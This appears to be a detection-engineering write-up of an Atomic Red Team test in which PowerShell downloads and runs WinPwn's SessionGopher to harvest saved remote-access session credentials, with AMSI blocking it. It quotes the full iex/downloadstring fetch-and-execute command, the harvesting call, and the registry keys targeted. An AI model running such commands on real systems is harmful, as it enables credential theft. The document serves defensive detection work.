# T1552.001-11: Credentials In Files — WinPwn - SessionGopher

## Technique Context

Credentials in Files (T1552.001) encompasses harvesting credentials from application configuration and session storage files. SessionGopher, integrated into WinPwn, extracts saved session information from remote access tools including PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP. These tools frequently store host names, usernames, and in some cases passwords in the Windows registry or plaintext files. SessionGopher is a well-known post-exploitation tool originally by fireeye/dafthack.

## What This Dataset Contains

The attack command is captured verbatim in PowerShell 4104 script blocks and Sysmon EID 1:

> `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')` followed by `sessionGopher -noninteractive -consoleoutput`

The download-and-execute pattern is identical to the other WinPwn tests in this series. A Sysmon EID 22 DNS query confirms resolution of `raw.githubusercontent.com`. PowerShell 4100 records AMSI blocking the WinPwn content with `ScriptContainedMaliciousContent`. The EID 4103 module log confirms `New-Object net.webclient` execution. Two Sysmon EID 10 events record PowerShell process access to child processes.

The 47 Sysmon events break down as: 35 EID 7 image loads (two PowerShell instances, slightly more DLLs than T1552.001-10 — possibly reflecting a second Defender scan cycle), 4 EID 17 named pipe creates (one extra compared to the passhunt test), 3 EID 11 file creates, 2 EID 1 process creates, 2 EID 10 process access events, and 1 EID 22 DNS query. The extra pipe creation and DLL loads suggest the child PowerShell process ran slightly longer or initialized additional components before AMSI terminated it.

## What This Dataset Does Not Contain (and Why)

SessionGopher's actual registry and file system access — querying `HKCU:\Software\SimonTatham\PuTTY\Sessions`, `HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions`, and similar keys — never occurred. AMSI blocked the WinPwn script content before `sessionGopher` could be defined or called. There are no registry access events (which would require object access auditing to capture anyway), no file reads of session storage files, and no credential output. The slightly elevated Sysmon event count compared to the passhunt test is within normal variation and does not indicate any SessionGopher activity.

## Assessment

This dataset is structurally nearly identical to T1552.001-10 (WinPwn passhunt). The difference is the specific WinPwn function called — `sessionGopher -noninteractive -consoleoutput` versus `passhunt -local $true -noninteractive`. Both are blocked by AMSI at the same point in execution. The dataset documents the execution infrastructure for a session credential harvesting attempt without any of the actual harvesting activity. It is a companion to T1552.001-10 useful for testing that WinPwn detection rules cover the full function namespace, not just passhunt.

## Detection Opportunities Present in This Data

- **PowerShell 4104 script block**: `sessionGopher` combined with the WinPwn download URL is a specific, unambiguous indicator. The `-noninteractive -consoleoutput` flags are common in automated/headless execution contexts.
- **PowerShell 4100 AMSI block**: `ScriptContainedMaliciousContent` from `InvokeExpressionCommand` is present, identical to the other WinPwn tests.
- **Sysmon EID 22 DNS query** for `raw.githubusercontent.com` from `powershell.exe`: as with the other WinPwn tests, this is the earliest network-layer indicator.
- **WinPwn commit-pinned URL** (`121dcee26a7aca368821563cbe92b2b5638c5773`): this exact commit hash appears across all WinPwn ART tests, making it an effective IOC for the entire WinPwn test suite.
- **Security 4688 / Sysmon EID 1**: The full child powershell.exe command line is captured in the process creation record.
